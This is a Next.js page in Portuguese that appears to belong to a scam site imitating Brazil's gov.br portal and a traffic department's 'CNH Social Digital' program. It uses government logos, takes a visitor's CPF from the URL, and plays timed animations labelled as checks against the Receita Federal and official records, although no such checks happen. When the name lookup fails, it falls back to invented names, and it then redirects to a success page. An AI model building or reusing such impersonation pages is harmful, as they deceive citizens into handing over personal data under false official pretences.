"use client"

import { useEffect, useState, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { User, Menu, Mic, Search, ChevronDown, Check } from "lucide-react"
import { useSearchParams, useRouter } from "next/navigation"
import Link from "next/link"

interface UserData {
  nome?: string
  cpf?: string
  error?: string
}

interface VerificationStep {
  id: string
  title: string
  subtitle: string
  completed: boolean
}

export default function FinalPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [loading, setLoading] = useState(true)
  const [progress, setProgress] = useState(0)
  const [currentStep, setCurrentStep] = useState(0)
  const [verificationSteps, setVerificationSteps] = useState<VerificationStep[]>([
    {
      id: "nome",
      title: "Verificando Nome completo",
      subtitle: "Consultando cadastro nacional",
      completed: false,
    },
    {
      id: "cpf",
      title: "Verificando CPF",
      subtitle: "Consultando bases da Receita Federal",
      completed: false,
    },
    {
      id: "validacao",
      title: "Validando CPF",
      subtitle: "Verificação de autenticidade",
      completed: false,
    },
    {
      id: "nascimento",
      title: "Validando Data de Nascimento",
      subtitle: "Comparação com registros oficiais",
      completed: false,
    },
    {
      id: "legitimidade",
      title: "Verificando legitimidade",
      subtitle: "Análise de documentação",
      completed: false,
    },
  ])

  const searchParams = useSearchParams()
  const router = useRouter()

  const fetchUserData = useCallback(async (cpf: string) => {
    try {
      setLoading(true)

      const response = await fetch(`/api/cpf?cpf=${cpf}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
        },
      })

      if (response.ok) {
        const data = await response.json()

        let nomeCompleto = null

        if (data?.nome) {
          nomeCompleto = data.nome
        } else if (data?.name) {
          nomeCompleto = data.name
        }

        if (nomeCompleto) {
          const primeiroNome = nomeCompleto.split(" ")[0]

          setUserData({
            nome: primeiroNome,
            cpf: cpf,
          })
        } else {
          throw new Error("Nome não encontrado na resposta da API")
        }
      } else {
        throw new Error("Erro na API")
      }
    } catch (error) {
      console.log("❌ Erro capturado:", error)

      // Fallback com dados simulados
      const nomesPorCPF = {
        "46960142822": "Roberto",
        "12345678900": "João",
        "98765432100": "Maria",
        "11111111111": "Pedro",
        "22222222222": "Ana",
        "33333333333": "Carlos",
        "44444444444": "Lucia",
        "55555555555": "José",
        "66666666666": "Fernanda",
        "77777777777": "Paulo",
        "88888888888": "Beatriz",
      }

      let nomeSimulado = nomesPorCPF[cpf as keyof typeof nomesPorCPF]

      if (!nomeSimulado) {
        const nomes = ["João", "Maria", "Pedro", "Ana", "Carlos", "Lucia", "José", "Fernanda", "Davi", "Beatriz"]
        const indice = Number.parseInt(cpf.slice(-1)) % nomes.length
        nomeSimulado = nomes[indice]
      }

      setUserData({
        nome: nomeSimulado,
        cpf: cpf,
      })
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    const cpfFromUrl = searchParams.get("cpf")

    if (cpfFromUrl && !userData) {
      fetchUserData(cpfFromUrl)
    } else if (!cpfFromUrl) {
      setLoading(false)
    }
  }, [searchParams, fetchUserData, userData])

  // Animação de progresso e verificação
  useEffect(() => {
    if (!loading) {
      const interval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + 2
          if (newProgress >= 100) {
            clearInterval(interval)
            // Navegar para próxima página após completar
            setTimeout(() => {
              const cpfFromUrl = searchParams.get("cpf")
              router.push(`/sucesso?cpf=${cpfFromUrl}`)
            }, 1000)
            return 100
          }
          return newProgress
        })
      }, 100) // Atualiza a cada 100ms para completar em 5 segundos

      return () => clearInterval(interval)
    }
  }, [loading, router, searchParams])

  // Animação dos steps de verificação
  useEffect(() => {
    if (!loading) {
      const stepInterval = setInterval(() => {
        setCurrentStep((prev) => {
          if (prev < verificationSteps.length - 1) {
            setVerificationSteps((steps) =>
              steps.map((step, index) => ({
                ...step,
                completed: index <= prev,
              })),
            )
            return prev + 1
          } else {
            setVerificationSteps((steps) =>
              steps.map((step) => ({
                ...step,
                completed: true,
              })),
            )
            clearInterval(stepInterval)
            return prev
          }
        })
      }, 1000) // Cada step completa em 1 segundo

      return () => clearInterval(stepInterval)
    }
  }, [loading, verificationSteps.length])

  if (loading) {
    return (
      <div className="min-h-screen bg-white">
        <header className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-14">
              <div className="flex items-center space-x-4">
                <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1">
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1 items-center">
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                    <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="grid grid-cols-2 gap-1">
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
              </div>
              <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
                <User className="w-4 h-4 mr-2" />
                <span className="font-medium text-sm">Carregando...</span>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-64px)]">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1857b5] mx-auto mb-4"></div>
            <p className="text-gray-600">Carregando validação...</p>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Principal */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-14">
            <div className="flex items-center space-x-4">
              <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1">
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1 items-center">
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                  <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="grid grid-cols-2 gap-1">
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>
            </div>

            {/* User Badge */}
            <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
              <User className="w-4 h-4 mr-2" />
              <span className="font-medium text-sm">{userData?.nome || "Usuário"}</span>
            </div>
          </div>
        </div>
      </header>

      {/* Header Secundário */}
      <div className="bg-white border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-12">
            <div className="flex items-center">
              <Button variant="ghost" size="sm" className="p-1.5 mr-3">
                <Menu className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <h2 className="text-sm font-medium text-gray-800 whitespace-nowrap">Departamento Estadual de Trânsito</h2>
            </div>
            <div className="flex items-center space-x-3">
              <Button variant="ghost" size="sm" className="p-1.5">
                <Mic className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <Button variant="ghost" size="sm" className="p-1.5">
                <Search className="w-4 h-4 text-[#1857b5]" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="bg-gray-50 border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <nav className="text-sm">
            <Link href="#" className="text-[#1857b5] hover:underline">
              Início
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              Serviços
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              CNH
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <span className="text-gray-700">CNH Social Digital</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Card Container */}
        <Card className="shadow-lg">
          <CardContent className="p-8">
            <div className="flex justify-between items-start mb-8">
              <div>
                <h1 className="text-2xl font-bold text-[#1857b5] mb-4">
                  Validando
                  <br />
                  seus dados
                </h1>

                <p className="text-gray-700 text-sm max-w-2xl">
                  Nossos sistemas oficiais irão analisar seus dados para confirmar se são válidos para o cadastro no
                  programa.
                </p>
              </div>

              {/* Logo Governo Federal */}
              <div className="flex items-center flex-shrink-0 ml-4">
                <img
                  src="/images/governo-federal-logo.png"
                  alt="Governo Federal"
                  className="h-10 object-contain"
                  style={{ maxWidth: "120px" }}
                />
              </div>
            </div>

            {/* Seção de Progresso */}
            <div className="mb-8">
              <h2 className="text-xl font-semibold text-[#1857b5] mb-6 text-center">Verificação em Progresso</h2>

              {/* Barra de Progresso */}
              <div className="mb-8">
                <div className="flex justify-between text-sm text-gray-600 mb-2">
                  <span>0%</span>
                  <span>50%</span>
                  <span>100%</span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-3">
                  <div
                    className="bg-[#1857b5] h-3 rounded-full transition-all duration-300 ease-out"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
              </div>

              {/* Steps de Verificação */}
              <div className="space-y-4">
                {verificationSteps.map((step, index) => (
                  <div key={step.id} className="flex items-start">
                    <div
                      className={`w-12 h-12 rounded-full flex items-center justify-center mr-4 flex-shrink-0 transition-all duration-500 ${
                        step.completed
                          ? "bg-green-100 border-2 border-green-500"
                          : index === currentStep
                            ? "bg-blue-100 border-2 border-blue-400"
                            : "bg-gray-100 border-2 border-gray-300"
                      }`}
                    >
                      {step.completed ? (
                        <Check className="w-6 h-6 text-green-600" />
                      ) : index === currentStep ? (
                        <div className="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                      ) : (
                        <div className="w-3 h-3 rounded-full bg-gray-400"></div>
                      )}
                    </div>
                    <div>
                      <h3
                        className={`text-lg font-semibold ${step.completed ? "text-green-600" : index === currentStep ? "text-blue-600" : "text-gray-800"}`}
                      >
                        {step.title}
                      </h3>
                      <p className="text-gray-500 text-sm">{step.subtitle}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Sistema de Verificação Segura */}
            <div className="mt-8 p-4 bg-green-50 border border-green-200 rounded-lg">
              <h3 className="text-lg font-semibold text-green-800 mb-2">Sistema de Verificação Segura</h3>
              <p className="text-green-700 text-sm">
                Todos os dados são verificados através de sistemas oficiais do governo federal para garantir a
                autenticidade e segurança do processo.
              </p>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-[#082041] text-white">
        <div className="max-w-7xl mx-auto px-4 py-12">
          <div className="text-center mb-8">
            <img src="/images/logo-white.png" alt="gov.br" className="h-16 mx-auto" />
          </div>

          <div className="space-y-6">
            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">SERVIÇOS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">TEMAS EM DESTAQUE</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">NOTÍCIAS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">POR DENTRO DO GOV.BR</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">CANAIS DO EXECUTIVO FEDERAL</span>
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">DADOS DO GOVERNO FEDERAL</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>
          </div>

          <div className="mt-12 pt-8 border-t border-[#1a365d]">
            <h4 className="text-lg font-semibold mb-4">REDES SOCIAIS</h4>
            <div className="flex space-x-4">
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                📷
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                f
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                ▶️
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                in
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                💬
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                🎵
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                👥
              </Button>
            </div>
          </div>

          <div className="mt-8 flex items-center">
            <div className="bg-white rounded-full p-2 mr-3">
              <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">i</span>
              </div>
            </div>
            <div>
              <div className="font-semibold">Acesso à</div>
              <div className="font-semibold">Informação</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
